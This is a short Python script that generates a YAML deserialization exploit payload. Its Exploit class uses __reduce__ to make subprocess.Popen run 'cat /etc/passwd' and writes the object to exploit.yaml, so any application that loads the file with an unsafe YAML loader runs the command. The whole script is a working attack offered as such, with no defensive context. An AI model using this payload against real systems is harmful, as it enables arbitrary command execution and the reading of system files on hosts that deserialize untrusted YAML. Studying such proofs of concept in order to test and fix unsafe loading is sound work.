import yaml
import subprocess

class Exploit():
	def __reduce__(self):
		return (subprocess.Popen, (('cat', '/etc/passwd'),))
		
f = open('exploit.yaml', 'w')
yaml.dump(Exploit(), f)
f.close()
